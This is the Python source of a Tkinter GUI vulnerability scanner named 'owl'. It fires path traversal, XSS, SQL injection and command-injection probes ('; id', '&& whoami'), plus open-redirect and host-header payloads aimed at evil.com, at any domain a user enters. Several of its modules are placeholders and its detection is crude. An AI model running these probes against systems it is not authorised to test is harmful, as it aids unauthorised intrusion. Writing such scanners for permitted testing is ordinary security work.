import tkinter as tk
from tkinter import scrolledtext, filedialog, ttk, messagebox
import threading
from queue import Queue, Empty
import requests
from bs4 import BeautifulSoup
import re
import socket
import time
import urllib.parse
import warnings

warnings.filterwarnings("ignore", message="Unverified HTTPS request")


BG_COLOR = "#000000"
FG_COLOR = "#00FF00"
FONT = ("Consolas", 11)
THREADS = 30


session = requests.Session()
scanning = False
results_queue = Queue()
progress_lock = threading.Lock()



def log(text):
    results_queue.put(text + "\n")

def safe_request(method, url, **kwargs):
    try:
        if method.lower() == "get":
            return session.get(url, timeout=7, verify=False, **kwargs)
        elif method.lower() == "post":
            return session.post(url, timeout=7, verify=False, **kwargs)
    except Exception:
        return None

def update_progress(current, total, task_name):
    with progress_lock:
        progress_bar["maximum"] = total
        progress_bar["value"] = current
        progress_label.config(text=f"{task_name} Progress: {current}/{total}")
        root.update_idletasks()

def finish_progress(task_name):
    progress_label.config(text=f"{task_name} Completed.")
    progress_bar["value"] = 0
    root.update_idletasks()



def dir_traversal_worker(queue, domain, progress_callback):
    while True:
        path = queue.get()
        if path is None:
            queue.task_done()
            break
        try:
            traversal_path = urllib.parse.urljoin(f"http://{domain}/", path)
            resp = safe_request("get", traversal_path)
            if resp and resp.status_code == 200 and any(keyword in resp.text.lower() for keyword in ["root:", "[boot]", "[fonts]", "etc/passwd", "administrator"]):
                log(f"[!!] Possible Directory Traversal found: {traversal_path}")
        except Exception:
            pass
        progress_callback()
        queue.task_done()

def start_dir_traversal_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return

    output_text.delete(1.0, tk.END)
    log(f"Starting Directory Traversal scan on {domain} ...")
    traversal_paths = [
        "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
        "../../windows/win.ini", "../../../windows/win.ini",
        "../../../../windows/win.ini"
    ]

    total = len(traversal_paths)
    queue = Queue()
    scanned = [0]

    def progress_update():
        scanned[0] += 1
        update_progress(scanned[0], total, "Dir Traversal")

    for _ in range(THREADS):
        t = threading.Thread(target=dir_traversal_worker, args=(queue, domain, progress_update))
        t.daemon = True
        t.start()

    for p in traversal_paths:
        queue.put(p)

    def finish():
        queue.join()
        for _ in range(THREADS):
            queue.put(None)
        finish_progress("Dir Traversal")

    threading.Thread(target=finish).start()
    process_results()

def xss_exploit_test(form_action, form_method, inputs, domain):
    xss_payload = "<script>alert('xss')</script>"
    data = {}
    for name in inputs:
        data[name] = xss_payload

    url = urllib.parse.urljoin(f"http://{domain}/", form_action)
    if form_method == "post":
        resp = safe_request("post", url, data=data)
    else:
        resp = safe_request("get", url, params=data)
    if resp and xss_payload in resp.text:
        return True
    return False

def start_xss_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting XSS scan on {domain} ...")
    try:
        url = f"http://{domain}"
        resp = safe_request("get", url)
        if not resp:
            log("Failed to fetch the page.")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            log("No forms found on the page.")
            return

        total = len(forms)
        scanned = [0]

        for i, form in enumerate(forms, 1):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
            log(f"Form #{i} at {action} with method {method.upper()}")
            vulnerable = xss_exploit_test(action, method, inputs, domain)
            if vulnerable:
                log("[!!] Possible XSS vulnerability detected and exploited!")
            else:
                log("[i] No XSS vulnerability detected.")
            scanned[0] += 1
            update_progress(scanned[0], total, "XSS Scan")

        finish_progress("XSS Scan")

    except Exception as e:
        log(f"Error during XSS scan: {str(e)}")
    process_results()

def sql_injection_test(form_action, form_method, inputs, domain):
    sqli_payload = "' OR '1'='1"
    data = {}
    for name in inputs:
        data[name] = sqli_payload

    url = urllib.parse.urljoin(f"http://{domain}/", form_action)
    if form_method == "post":
        resp = safe_request("post", url, data=data)
    else:
        resp = safe_request("get", url, params=data)
    if resp and re.search(r"syntax error|mysql|sql|warning|error", resp.text, re.I):
        return True
    return False

def start_sqli_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting SQL Injection scan on {domain} ...")
    try:
        url = f"http://{domain}"
        resp = safe_request("get", url)
        if not resp:
            log("Failed to fetch the page.")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            log("No forms found on the page.")
            return

        total = len(forms)
        scanned = [0]

        for i, form in enumerate(forms, 1):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
            log(f"Form #{i} at {action} with method {method.upper()}")
            vulnerable = sql_injection_test(action, method, inputs, domain)
            if vulnerable:
                log("[!!] Possible SQL Injection vulnerability detected and exploited!")
            else:
                log("[i] No SQL Injection vulnerability detected.")
            scanned[0] += 1
            update_progress(scanned[0], total, "SQLi Scan")

        finish_progress("SQLi Scan")

    except Exception as e:
        log(f"Error during SQLi scan: {str(e)}")
    process_results()

def csrf_check(form):
    hidden_inputs = form.find_all("input", type="hidden")
    for inp in hidden_inputs:
        name = inp.get("name", "")
        if "csrf" in name.lower():
            return True
    return False

def start_csrf_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting CSRF token check on {domain} ...")
    try:
        url = f"http://{domain}"
        resp = safe_request("get", url)
        if not resp:
            log("Failed to fetch the page.")
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            log("No forms found on the page.")
            return

        total = len(forms)
        scanned = [0]

        for i, form in enumerate(forms, 1):
            log(f"Form #{i}:")
            if csrf_check(form):
                log("[i] CSRF token found.")
            else:
                log("[!!] Possible missing CSRF token.")
            scanned[0] += 1
            update_progress(scanned[0], total, "CSRF Check")

        finish_progress("CSRF Check")

    except Exception as e:
        log(f"Error during CSRF scan: {str(e)}")
    process_results()

def rce_test(domain):
    try:
        payloads = [";id", "&&whoami"]
        url = f"http://{domain}/"
        total = len(payloads)
        scanned = 0
        for p in payloads:
            test_url = url + f"?vulnparam={urllib.parse.quote(p)}"
            resp = safe_request("get", test_url)
            scanned += 1
            update_progress(scanned, total, "RCE Test")
            if resp and re.search(r"uid=\d+|root|administrator|www-data", resp.text, re.I):
                log(f"[!!] Possible RCE vulnerability detected with payload {p}")
                finish_progress("RCE Test")
                return
        log("[i] No RCE vulnerability detected.")
        finish_progress("RCE Test")
    except Exception as e:
        log(f"Error during RCE test: {str(e)}")

def start_rce_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting Remote Code Execution (RCE) scan on {domain} ...")
    threading.Thread(target=rce_test, args=(domain,)).start()
    process_results()

def file_upload_test(domain):
    log("[i] File Upload vulnerability testing requires manual endpoint and payload.")
    log("[i] This is a placeholder for a file upload vulnerability test.")
    finish_progress("File Upload Test")
    process_results()

def start_file_upload_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting File Upload vulnerability scan on {domain} ...")
    threading.Thread(target=file_upload_test, args=(domain,)).start()

def ssrf_test(domain):
    log("[i] SSRF vulnerability testing requires specific parameters and endpoints.")
    log("[i] This is a placeholder for SSRF scan.")
    finish_progress("SSRF Test")
    process_results()

def start_ssrf_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting SSRF scan on {domain} ...")
    threading.Thread(target=ssrf_test, args=(domain,)).start()

def xml_injection_test(domain):
    log("[i] XML Injection vulnerability testing requires XML endpoints and payloads.")
    log("[i] This is a placeholder for XML Injection scan.")
    finish_progress("XML Injection Test")
    process_results()

def start_xml_injection_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting XML Injection scan on {domain} ...")
    threading.Thread(target=xml_injection_test, args=(domain,)).start()

def open_redirect_test(domain):
    test_payloads = [
        "http://evil.com",
        "//evil.com",
        "/\\evil.com",
        "///evil.com",
        "///\\evil.com"
    ]
    vulnerable_found = False
    total = len(test_payloads)
    scanned = 0
    for payload in test_payloads:
        test_url = f"http://{domain}/redirect?url={urllib.parse.quote(payload)}"
        resp = safe_request("get", test_url, allow_redirects=False)
        scanned += 1
        update_progress(scanned, total, "Open Redirect Test")
        if resp and resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get("Location", "")
            if payload.strip('/').lower() in location.lower():
                log(f"[!!] Possible Open Redirect vulnerability with payload: {payload}")
                vulnerable_found = True
    if not vulnerable_found:
        log("[i] No Open Redirect vulnerability detected.")
    finish_progress("Open Redirect Test")

def start_open_redirect_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting Open Redirect scan on {domain} ...")
    threading.Thread(target=open_redirect_test, args=(domain,)).start()

def host_header_injection_test(domain):
    test_headers = {
        "Host": "evil.com"
    }
    url = f"http://{domain}/"
    resp = safe_request("get", url, headers=test_headers)
    if resp and "evil.com" in resp.text:
        log("[!!] Possible Host Header Injection vulnerability detected!")
    else:
        log("[i] No Host Header Injection vulnerability detected.")
    finish_progress("Host Header Injection Test")

def start_host_header_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting Host Header Injection scan on {domain} ...")
    threading.Thread(target=host_header_injection_test, args=(domain,)).start()

def clickjacking_test(domain):
    url = f"http://{domain}/"
    resp = safe_request("get", url)
    if resp:
        x_frame = resp.headers.get("X-Frame-Options")
        csp = resp.headers.get("Content-Security-Policy", "")
        if x_frame and x_frame.lower() != "deny":
            log("[!!] Potential Clickjacking vulnerability: X-Frame-Options header present but not 'DENY'")
        elif "frame-ancestors" in csp.lower():
            log("[i] Content-Security-Policy frame-ancestors directive present, Clickjacking mitigated")
        else:
            log("[!!] Possible Clickjacking vulnerability: Missing or misconfigured X-Frame-Options and CSP headers")
    else:
        log("[i] Could not fetch page headers for Clickjacking test.")
    finish_progress("Clickjacking Test")

def start_clickjacking_scan():
    domain = domain_entry.get().strip()
    if not domain:
        messagebox.showerror("Input Error", "Please enter a domain or IP address.")
        return
    output_text.delete(1.0, tk.END)
    log(f"Starting Clickjacking scan on {domain} ...")
    threading.Thread(target=clickjacking_test, args=(domain,)).start()



def process_results():
    try:
        while True:
            line = results_queue.get_nowait()
            output_text.insert(tk.END, line)
            output_text.see(tk.END)
            results_queue.task_done()
    except Empty:
        pass
    root.after(100, process_results)



def save_report():
    content = output_text.get(1.0, tk.END).strip()
    if not content:
        messagebox.showinfo("Save Report", "Nothing to save.")
        return
    filename = filedialog.asksaveasfilename(
        defaultextension=".txt",
        filetypes=[("Text Files", "*.txt")],
        title="Save Report As"
    )
    if filename:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content)
        messagebox.showinfo("Save Report", f"Report saved to {filename}")



root = tk.Tk()
root.title("owl - Advanced Vulnerability Scanner")
root.geometry("1100x750")
root.configure(bg=BG_COLOR)


domain_label = tk.Label(root, text="Domain or IP:", bg=BG_COLOR, fg=FG_COLOR, font=FONT)
domain_label.pack(pady=(10,0))
domain_entry = tk.Entry(root, font=FONT, bg="#003300", fg=FG_COLOR, insertbackground=FG_COLOR)
domain_entry.pack(fill=tk.X, padx=10, pady=(0,10))


buttons_frame1 = tk.Frame(root, bg=BG_COLOR)
buttons_frame1.pack(pady=(0,5))
buttons_frame2 = tk.Frame(root, bg=BG_COLOR)
buttons_frame2.pack(pady=(0,10))
buttons_frame3 = tk.Frame(root, bg=BG_COLOR)
buttons_frame3.pack(pady=(0,10))

btn_dir_traversal = tk.Button(buttons_frame1, text="Dir Traversal Scan", command=lambda: threading.Thread(target=start_dir_traversal_scan).start(),
                              bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_dir_traversal.pack(side=tk.LEFT, padx=5)

btn_xss = tk.Button(buttons_frame1, text="XSS Scan & Exploit", command=lambda: threading.Thread(target=start_xss_scan).start(),
                    bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_xss.pack(side=tk.LEFT, padx=5)

btn_sqli = tk.Button(buttons_frame1, text="SQL Injection Scan & Exploit", command=lambda: threading.Thread(target=start_sqli_scan).start(),
                     bg="#004400", fg=FG_COLOR, font=FONT, width=22)
btn_sqli.pack(side=tk.LEFT, padx=5)

btn_csrf = tk.Button(buttons_frame1, text="CSRF Token Check", command=lambda: threading.Thread(target=start_csrf_scan).start(),
                     bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_csrf.pack(side=tk.LEFT, padx=5)

btn_rce = tk.Button(buttons_frame2, text="Remote Code Execution Scan", command=lambda: threading.Thread(target=start_rce_scan).start(),
                    bg="#004400", fg=FG_COLOR, font=FONT, width=28)
btn_rce.pack(side=tk.LEFT, padx=5)

btn_file_upload = tk.Button(buttons_frame2, text="File Upload Vulnerability", command=lambda: threading.Thread(target=start_file_upload_scan).start(),
                            bg="#004400", fg=FG_COLOR, font=FONT, width=28)
btn_file_upload.pack(side=tk.LEFT, padx=5)

btn_ssrf = tk.Button(buttons_frame2, text="SSRF Scan", command=lambda: threading.Thread(target=start_ssrf_scan).start(),
                     bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_ssrf.pack(side=tk.LEFT, padx=5)

btn_xml_injection = tk.Button(buttons_frame2, text="XML Injection Scan", command=lambda: threading.Thread(target=start_xml_injection_scan).start(),
                              bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_xml_injection.pack(side=tk.LEFT, padx=5)

btn_open_redirect = tk.Button(buttons_frame3, text="Open Redirect Scan", command=lambda: threading.Thread(target=start_open_redirect_scan).start(),
                              bg="#004400", fg=FG_COLOR, font=FONT, width=22)
btn_open_redirect.pack(side=tk.LEFT, padx=5)

btn_host_header = tk.Button(buttons_frame3, text="Host Header Injection Scan", command=lambda: threading.Thread(target=start_host_header_scan).start(),
                            bg="#004400", fg=FG_COLOR, font=FONT, width=26)
btn_host_header.pack(side=tk.LEFT, padx=5)

btn_clickjacking = tk.Button(buttons_frame3, text="Clickjacking Scan", command=lambda: threading.Thread(target=start_clickjacking_scan).start(),
                             bg="#004400", fg=FG_COLOR, font=FONT, width=18)
btn_clickjacking.pack(side=tk.LEFT, padx=5)


output_text = scrolledtext.ScrolledText(root, bg="#001100", fg=FG_COLOR, font=FONT, height=25, wrap=tk.WORD)
output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)


progress_label = tk.Label(root, text="", bg=BG_COLOR, fg=FG_COLOR, font=FONT)
progress_label.pack(pady=(0, 2))
progress_bar = ttk.Progressbar(root, orient="horizontal", length=900, mode="determinate")
progress_bar.pack(padx=10)


save_button = tk.Button(root, text="Save Report", command=save_report, bg="#006600", fg=FG_COLOR, font=FONT, width=20)
save_button.pack(pady=10)

footer = tk.Label(root, text="🦉 khaled.s.haddad | khaledhaddad.tech", bg=BG_COLOR, fg=FG_COLOR, font=("Consolas", 10, "italic"))
footer.pack(side=tk.BOTTOM, pady=5)


process_results()

root.mainloop()
